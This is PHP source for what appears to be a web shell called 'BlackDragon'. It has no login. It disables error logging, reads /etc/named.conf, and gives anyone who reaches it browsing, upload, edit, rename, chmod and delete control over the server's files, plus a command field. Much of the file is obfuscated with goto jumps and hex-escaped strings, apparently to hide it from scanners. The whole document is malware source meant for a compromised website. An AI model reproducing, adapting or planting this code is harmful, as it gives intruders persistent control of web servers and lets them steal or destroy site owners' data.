<?php
 session_start(); error_reporting(0); set_time_limit(0); @ini_set('error_log', 0); @ini_set('log_errors', 0); @ini_set('max_execution_time', 0); @ini_set('output_buffering', 0); @ini_set('display_errors', 0); function flash($message, $status, $class, $redirect = false) { if (!empty($_SESSION["message"])) { unset($_SESSION["message"]); } if (!empty($_SESSION["class"])) { unset($_SESSION["class"]); } if (!empty($_SESSION["status"])) { unset($_SESSION["status"]); } $_SESSION["message"] = $message; $_SESSION["class"] = $class; $_SESSION["status"] = $status; if ($redirect) { header('Location: ' . $redirect); exit(); } return true; } function clear() { if (!empty($_SESSION["message"])) { unset($_SESSION["message"]); } if (!empty($_SESSION["class"])) { unset($_SESSION["class"]); } if (!empty($_SESSION["status"])) { unset($_SESSION["status"]); } return true; } function writable($path, $perms){ return (!is_writable($path)) ? "<font color=\"red\">".$perms."</font>" : "<font color=\"lime\">".$perms."</font>"; } function perms($path) { $perms = fileperms($path); if (($perms & 0xC000) == 0xC000) { $info = 's'; } elseif (($perms & 0xA000) == 0xA000) { $info = 'l'; } elseif (($perms & 0x8000) == 0x8000) { $info = '-'; } elseif (($perms & 0x6000) == 0x6000) { $info = 'b'; } elseif (($perms & 0x4000) == 0x4000) { $info = 'd'; } elseif (($perms & 0x2000) == 0x2000) { $info = 'c'; } elseif (($perms & 0x1000) == 0x1000) { $info = 'p'; } else { $info = 'u'; } $info .= (($perms & 0x0100) ? 'r' : '-'); $info .= (($perms & 0x0080) ? 'w' : '-'); $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-')); $info .= (($perms & 0x0020) ? 'r' : '-'); $info .= (($perms & 0x0010) ? 'w' : '-'); $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-')); $info .= (($perms & 0x0004) ? 'r' : '-'); $info .= (($perms & 0x0002) ? 'w' : '-'); $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-')); return $info; } function fsize($file) { $a = ["B", "KB", "MB", "GB", "TB", "PB"]; $pos = 0; $size = filesize($file); while ($size >= 1024) { $size /= 1024; $pos++; } return round($size, 2)." ".$a[$pos]; } if (isset($_GET['dir'])) { $path = $_GET['dir']; chdir($_GET['dir']); } else { $path = getcwd(); } $path = str_replace('\\', '/', $path); $exdir = explode('/', $path); function getOwner($item) { if (function_exists("posix_getpwuid")) { $downer = @posix_getpwuid(fileowner($item)); $downer = $downer['name']; } else { $downer = fileowner($item); } if (function_exists("posix_getgrgid")) { $dgrp = @posix_getgrgid(filegroup($item)); $dgrp = $dgrp['name']; } else { $dgrp = filegroup($item); } return $downer . '/' . $dgrp; } if (isset($_POST['newFolderName'])) { if (mkdir($path . '/' . $_POST['newFolderName'])) { flash("Create Folder Successfully!", "Success", "success", "?dir=$path"); } else { flash("Create Folder Failed", "Failed", "error", "?dir=$path"); } } if (isset($_POST['newFileName']) && isset($_POST['newFileContent'])) { if (file_put_contents($_POST['newFileName'], $_POST['newFileContent'])) { flash("Create File Successfully!", "Success", "success", "?dir=$path"); } else { flash("Create File Failed", "Failed", "error", "?dir=$path"); } } if (isset($_POST['newName']) && isset($_GET['item'])) { if ($_POST['newName'] == '') { flash("You miss an important value", "Ooopss..", "warning", "?dir=$path"); } if (rename($path. '/'. $_GET['item'], $_POST['newName'])) { flash("Rename Successfully!", "Success", "success", "?dir=$path"); } else { flash("Rename Failed", "Failed", "error", "?dir=$path"); } } if (isset($_POST['newContent']) && isset($_GET['item'])) { if (file_put_contents($path. '/'. $_GET['item'], $_POST['newContent'])) { flash("Edit Successfully!", "Success", "success", "?dir=$path"); } else { flash("Edit Failed", "Failed", "error", "?dir=$path"); } } if (isset($_POST['newPerm']) && isset($_GET['item'])) { if ($_POST['newPerm'] == '') { flash("You miss an important value", "Ooopss..", "warning", "?dir=$path"); } if (chmod($path. '/'. $_GET['item'], $_POST['newPerm'])) { flash("Change Permission Successfully!", "Success", "success", "?dir=$path"); } else { flash("Change Permission", "Failed", "error", "?dir=$path"); } } if (isset($_GET['action']) && $_GET['action'] == 'delete' && isset($_GET['item'])) { if (is_dir($_GET['item'])) { if (rmdir($_GET['item'])) { flash("Delete Successfully!", "Success", "success", "?dir=$path"); } else { flash("Delete Failed", "Failed", "error", "?dir=$path"); } } else { if (unlink($_GET['item'])) { flash("Delete Successfully!", "Success", "success", "?dir=$path"); } else { flash("Delete Failed", "Failed", "error", "?dir=$path"); } } } if (isset($_FILES['uploadfile'])) { $total = count($_FILES['uploadfile']['name']); for ($i = 0; $i < $total; $i++) { $mainupload = move_uploaded_file($_FILES['uploadfile']['tmp_name'][$i], $_FILES['uploadfile']['name'][$i]); } if ($total < 2) { if ($mainupload) { flash("Upload File Successfully! ", "Success", "success", "?dir=$path"); } else { flash("Upload Failed", "Failed", "error", "?dir=$path"); } } else{ if ($mainupload) { flash("Upload $i Files Successfully! ", "Success", "success", "?dir=$path"); } else { flash("Upload Failed", "Failed", "error", "?dir=$path"); } } } $dirs = scandir($path); $d0mains = @file("/etc/named.conf", false); if (!$d0mains){ $dom = "Cant read /etc/named.conf"; $GLOBALS["need_to_update_header"] = "true"; }else{ $count = 0; foreach ($d0mains as $d0main){ if (@strstr($d0main, "zone")){ preg_match_all('#zone "(.*)"#', $d0main, $domains); flush(); if (strlen(trim($domains[1][0])) > 2){ flush(); $count++; } } } $dom = "$count Domain"; } ?>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
  <title><?= $_SERVER['SERVER_NAME'] ?></title>
</head>

<?php
 goto hauwU; rOBSj: cH8mW: goto hBHZ5; b0ENU: echo $_SERVER["\x53\105\122\126\105\122\137\x53\x4f\106\124\127\101\122\105"]; goto PmEoZ; zb1Q1: goto MOjJo; goto Qynio; u0NY7: m43eT: goto SGtCZ; KB4qQ: goto hLDuT; goto IdZNN; iddw6: Qum7j: goto eaJlv; d93Bd: goto Qum7j; goto uNAaQ; YWdy4: NdufR: goto DGtZ1; Ksgq4: goto BI7RR; goto OcRV8; Qynio: SFn2z: goto LEcZd; sGHdX: MOjJo: goto NjmYP; OzwZv: foreach ($dirs as $dir) { if (!is_dir($dir)) { continue; } ?>
<tr><td><?php  if ($dir === "\x2e\56") { ?>
<a class="text-light text-decoration-none"href="?dir=<?php  echo dirname($path); ?>
"><i class="fa fa-folder-open"></i><?php  echo $dir; ?>
</a><?php  } elseif ($dir === "\56") { ?>
<a class="text-light text-decoration-none"href="?dir=<?php  echo $path; ?>
"><i class="fa fa-folder-open"></i><?php  echo $dir; ?>
</a><?php  } else { ?>
<a class="text-light text-decoration-none"href="?dir=<?php  echo $path . "\x2f" . $dir; ?>
"><i class="fa fa-folder"></i><?php  echo $dir; ?>
</a><?php  } ?>
</td><td class="text-light"><?php  echo filetype($dir); ?>
</td><td class="text-light">-</td><td class="text-light"><?php  echo getOwner($dir); ?>
</td><td class="text-light"><?php  if (is_writable($path . "\57" . $dir)) { echo "\74\146\x6f\x6e\164\x20\143\x6f\154\x6f\x72\x3d\42\x6c\151\155\145\42\x3e"; } elseif (!is_readable($path . "\x2f" . $dir)) { echo "\74\x66\157\156\x74\x20\143\157\x6c\x6f\x72\x3d\x22\x72\x65\144\x22\76"; } echo perms($path . "\57" . $dir); if (is_writable($path . "\57" . $dir) || !is_readable($path . "\x2f" . $dir)) { } ?>
</td><td class="text-light"><?php  echo date("\x59\55\x6d\55\144\x20\x68\x3a\151\x3a\x73", filemtime($dir)); ?>
</td><td><?php  if ($dir != "\x2e" && $dir != "\56\x2e") { ?>
<div class="btn-group"><a class="btn btn-outline-light btn-sm mr-1"href="?dir=<?php  echo $path; ?>
&item=<?php  echo $dir; ?>
&action=rename"><i class="fa fa-edit"></i></a> <a class="btn btn-outline-light btn-sm mr-1"href="?dir=<?php  echo $path; ?>
&item=<?php  echo $dir; ?>
&action=chmod"><i class="fa fa-file-signature"></i></a> <a class="btn btn-outline-light btn-sm mr-1"href=""onclick='return deleteConfirm("?dir=<?php  echo $path; ?>
&item=<?php  echo $dir; ?>
&action=delete")'><i class="fa fa-trash"></i></a></div><?php  } elseif ($dir === "\56") { ?>
<div class="btn-group"><a class="btn btn-outline-light btn-sm mr-1"href="#newFolderCollapse"aria-controls="newFolderCollapse"aria-expanded="false"data-bs-toggle="collapse"role="button"><i class="fa fa-folder-plus"></i></a> <a class="btn btn-outline-light btn-sm mr-1"href="#newFileCollapse"aria-controls="newFileCollapse"aria-expanded="false"data-bs-toggle="collapse"role="button"><i class="fa fa-file-plus"></i></a></div><?php  } ?>
</td></tr><?php  } goto bq6SH; AFlnu: goto iW19L; goto sGHdX; i7pi8: clear(); goto mWEXw; QCfxl: goto i1FVz; goto u0NY7; hauwU: ?>
<body class="text-light bg-dark"><?php  goto QCfxl; V_y64: goto SFn2z; goto Os2iL; uNAaQ: iW19L: goto ahWUa; V5PPd: yrxPs: goto cJPTP; eaJlv: echo $dom; goto jolI6; X1MK4: ?>
[<?php  goto AfeZi; hBHZ5: if (isset($_POST["\x63\157\155\x6d\x61\156\x64"])) { ?>
<div class="row justify-content-center"><pre></pre></div><?php  } goto WoZVb; LEcZd: ?>
<br><i class="fa fa-fingerprint"></i> 	<?php  goto d93Bd; hrPom: goto L9AzP; goto iddw6; mXVKb: BI7RR: goto jr7a0; vYro2: echo writable($path, perms($path)); goto AFlnu; sG65p: ?>
<div class="container-fluid"><div class="py-3"id="main"><div class="bg-dark box p-4 rounded-3 shadow"><div class="mb-3 info"><i class="fa fa-server"></i> 	<?php  goto Ksgq4; neZoz: goto NdufR; goto MZOWk; zQoKp: N_VXD: goto KxtPW; DGtZ1: echo !@$_SERVER["\123\x45\122\126\x45\x52\x5f\x41\x44\104\x52"] ? gethostbyname($_SERVER["\x53\x45\x52\x56\x45\x52\137\116\101\115\105"]) : @$_SERVER["\123\105\122\x56\105\122\137\x41\x44\104\122"]; goto V_y64; RYS80: ?>
<div class="row justify-content-center"><div class="collapse"id="newFolderCollapse"data-bs-parent="#tools"style="transition:none"><form action=""method="post"><div class="mb-3"><label class="form-label"for="name">Folder Name</label> <input class="form-control"name="newFolderName"placeholder="BlackDragon"></div><button class="btn btn-outline-light"type="submit">Submit</button></form></div><div class="collapse"id="newFileCollapse"data-bs-parent="#tools"style="transition:none"><form action=""method="post"><div class="mb-3"><label class="form-label"for="name">File Name</label> <input class="form-control"name="newFileName"placeholder="blackdragon.php"></div><div class="mb-3"><label class="form-label"for="name">File Content</label> <textarea class="form-control"name="newFileContent"rows="10"placeholder="Hello World - BlackDragon"></textarea></div><button class="btn btn-outline-light"type="submit">Submit</button></form></div></div><div class="table-responsive"><table class="text-light table table-dark table-hover"><thead><tr><td style="width:35%">Name</td><td style="width:10%">Type</td><td style="width:10%">Size</td><td style="width:13%">Owner/Group</td><td style="width:10%">Permission</td><td style="width:13%">Last Modified</td><td style="width:9%">Actions</td></tr></thead><tbody class="text-nowrap"><?php  goto V9smb; ahWUa: ?>
] <a class="text-light text-decoration-none"href="?">[ HOME ]</a></div><div class="d-flex justify-content-between"><div class="p-2"><form action=""method="post"><div class="row"><div class="mb-3 col-md-9"><input class="form-control form-control-sm"name="command"placeholder="Command"></div><div class="col-md-3"><button class="btn btn-outline-light btn-sm"type="submit">Exec</button></div></div></form></div><div class="p-2"><form action=""method="post"enctype="multipart/form-data"><div class="row"><div class="mb-3 col-md-9"><input class="form-control form-control-sm"name="uploadfile[]"aria-describedby="inputGroupFileAddon04"aria-label="Upload"id="inputGroupFile04"multiple type="file"></div><div class="col-md-3"><button class="btn btn-outline-light btn-sm"type="submit">Submit</button></div></div></form></div></div><div class="container"id="tools"><?php  goto e_aIQ; AfeZi: goto KMrmS; goto MlxC3; e1LXm: if (isset($_SESSION["\155\145\163\163\x61\147\145"])) { ?>
Swal.fire(
      '<?php  echo $_SESSION["\x73\x74\x61\x74\165\x73"]; ?>
',
      '<?php  echo $_SESSION["\155\x65\x73\x73\141\147\x65"]; ?>
',
      '<?php  echo $_SESSION["\x63\154\141\x73\163"]; ?>
'
    )<?php  } goto i7pi8; MZOWk: L9AzP: goto dWrZs; MlxC3: hLDuT: goto b0ENU; O1oBN: goto by7N2; goto mXVKb; WoZVb: goto aXEYD; goto ENKjG; yLkGk: i1FVz: goto sG65p; cJPTP: ?>
</div><div class="breadcrumb"><i class="fa fa fa-folder pt-1"></i> 	<?php  goto zb1Q1; OcRV8: KMrmS: goto vYro2; SQYC2: goto OEjDD; goto V5PPd; HfCWa: goto zGYeR; goto rOBSj; PmEoZ: goto m43eT; goto kaxVW; kaxVW: by7N2: goto cTtDw; jr7a0: echo php_uname(); goto hrPom; NjmYP: foreach ($exdir as $id => $pat) { if ($pat == '' && $id == 0) { ?>
<a class="text-light text-decoration-none"href="?dir=/">/</a><?php  } if ($pat == '') { continue; } ?>
<a class="text-light text-decoration-none"href="?dir=<?php  for ($i = 0; $i <= $id; $i++) { echo "{$exdir[$i]}"; if ($i != $id) { echo "\57"; } } ?>
"><?php  echo $pat; ?>
</a><span class="text-light">/</span><?php  } goto HfCWa; dWrZs: ?>
<br><i class="fa fa-microchip"></i> 	<?php  goto KB4qQ; Os2iL: zGYeR: goto X1MK4; V9smb: goto uErGb; goto zQoKp; e_aIQ: goto cH8mW; goto NY9pR; KxtPW: foreach ($dirs as $dir) { if (!is_file($dir)) { continue; } ?>
<tr><td><a class="text-light text-decoration-none"href="?dir=<?php  echo $path; ?>
&item=<?php  echo $dir; ?>
&action=view"><i class="fa fa-file-code"></i><?php  echo $dir; ?>
</a></td><td class="text-light"><?php  echo function_exists("\155\x69\x6d\x65\137\x63\x6f\156\x74\x65\156\x74\x5f\164\x79\160\145") ? mime_content_type($dir) : filetype($dir); ?>
</td><td class="text-light"><?php  echo fsize($dir); ?>
</td><td class="text-light"><?php  echo getOwner($dir); ?>
</td><td class="text-light"><?php  if (is_writable($path . "\57" . $dir)) { echo "\x3c\146\157\x6e\x74\x20\143\x6f\x6c\157\x72\x3d\42\x6c\x69\x6d\145\x22\x3e"; } elseif (!is_readable($path . "\x2f" . $dir)) { echo "\x3c\x66\157\x6e\164\x20\143\157\x6c\x6f\x72\75\x22\x72\145\144\x22\76"; } echo perms($path . "\x2f" . $dir); if (is_writable($path . "\x2f" . $dir) || !is_readable($path . "\57" . $dir)) { } ?>
</td><td class="text-light"><?php  echo date("\131\55\x6d\x2d\144\40\x68\x3a\151\x3a\163", filemtime($dir)); ?>
</td><td><?php  if ($dir != "\x2e" && $dir != "\x2e\56") { ?>
<div class="btn-group"><a class="btn btn-outline-light btn-sm mr-1"href="?dir=<?php  echo $path; ?>
&item=<?php  echo $dir; ?>
&action=edit"><i class="fa fa-file-edit"></i></a> <a class="btn btn-outline-light btn-sm mr-1"href="?dir=<?php  echo $path; ?>
&item=<?php  echo $dir; ?>
&action=rename"><i class="fa fa-edit"></i></a> <a class="btn btn-outline-light btn-sm mr-1"href="?dir=<?php  echo $path; ?>
&item=<?php  echo $dir; ?>
&action=chmod"><i class="fa fa-file-signature"></i></a> <a class="btn btn-outline-light btn-sm mr-1"href=""onclick='return deleteConfirm("?dir=<?php  echo $path; ?>
&item=<?php  echo $dir; ?>
&action=delete")'><i class="fa fa-trash"></i></a></div><?php  } ?>
</td></tr><?php  } goto O1oBN; oujlf: if (isset($_GET["\x61\x63\164\x69\157\x6e"]) && $_GET["\141\143\164\151\x6f\156"] != "\144\145\x6c\145\164\145") { $action = $_GET["\141\143\164\151\x6f\156"]; ?>
<div class="row justify-content-center"><?php  if ($action == "\162\x65\156\x61\155\x65" && isset($_GET["\x69\164\x65\x6d"])) { ?>
<form action=""method="post"><div class="mb-3"><label class="form-label"for="name">New Name</label> <input class="form-control"name="newName"value="<?php  echo $_GET["\x69\164\x65\x6d"]; ?>
"></div><button class="btn btn-outline-light"type="submit">Submit</button> <button class="btn btn-outline-light"type="button"onclick="history.go(-1)">Back</button></form><?php  } elseif ($action == "\145\144\x69\164" && isset($_GET["\x69\164\145\x6d"])) { ?>
<form action=""method="post"><div class="mb-3"><label class="form-label"for="name"><?php  echo $_GET["\x69\164\x65\x6d"]; ?>
</label> <textarea class="form-control"name="newContent"rows="10"id="CopyFromTextArea"><?php  echo htmlspecialchars(file_get_contents($path . "\x2f" . $_GET["\x69\x74\145\155"])); ?>
</textarea></div><button class="btn btn-outline-light"type="submit">Submit</button> <button class="btn btn-outline-light"type="button"onclick="jscopy()">Copy</button> <button class="btn btn-outline-light"type="button"onclick="history.go(-1)">Back</button></form><?php  } elseif ($action == "\x76\x69\145\167" && isset($_GET["\151\164\x65\155"])) { ?>
<div class="mb-3"><label class="form-label"for="name">File Name :<?php  echo $_GET["\151\164\145\155"]; ?>
</label> <textarea class="form-control"name="newContent"rows="10"disabled><?php  echo htmlspecialchars(file_get_contents($path . "\x2f" . $_GET["\151\x74\145\155"])); ?>
</textarea><br><button class="btn btn-outline-light"type="button"onclick="history.go(-1)">Back</button></div><?php  } elseif ($action == "\143\x68\x6d\157\x64" && isset($_GET["\151\x74\x65\155"])) { ?>
<form action=""method="post"><div class="mb-3"><label class="form-label"for="name"><?php  echo $_GET["\151\164\x65\155"]; ?>
</label> <input class="form-control"name="newPerm"value="<?php  echo substr(sprintf("\45\x6f", fileperms($_GET["\151\x74\145\155"])), -4); ?>
"></div><button class="btn btn-outline-light"type="submit">Submit</button> <button class="btn btn-outline-light"type="button"onclick="history.go(-1)">Back</button></form><?php  } ?>
</div><?php  } goto SQYC2; bq6SH: goto N_VXD; goto YWdy4; SGtCZ: ?>
<br><i class="fa fa-satellite-dish"></i> 	<?php  goto neZoz; ENKjG: aXEYD: goto oujlf; IdZNN: OEjDD: goto RYS80; NY9pR: uErGb: goto OzwZv; jolI6: goto yrxPs; goto yLkGk; cTtDw: ?>
</tbody></table></div><div class="text-light">© BlackDragon<script type="text/javascript">var creditsyear=new Date;document.write(creditsyear.getFullYear())</script></div><script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"crossorigin="anonymous"integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p"></script><script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.4.0/dist/sweetalert2.all.min.js"></script><script><?php  goto e1LXm; mWEXw: ?>
function deleteConfirm(url) {
      event.preventDefault()
      Swal.fire({
          title: 'Are you sure?',
          icon: 'warning',
          showCancelButton: true,
          confirmButtonColor: '#3085d6',
          cancelButtonColor: '#d33',
          confirmButtonText: 'Yes, delete it!'
      }).then((result) => {
          if (result.isConfirmed) {
            window.location.href = url
        }
      })
    }
    function jscopy() {
      var jsCopy = document.getElementById("CopyFromTextArea");
      jsCopy.focus();
      jsCopy.select();
      document.execCommand("copy");
    }</script></body>
</html>
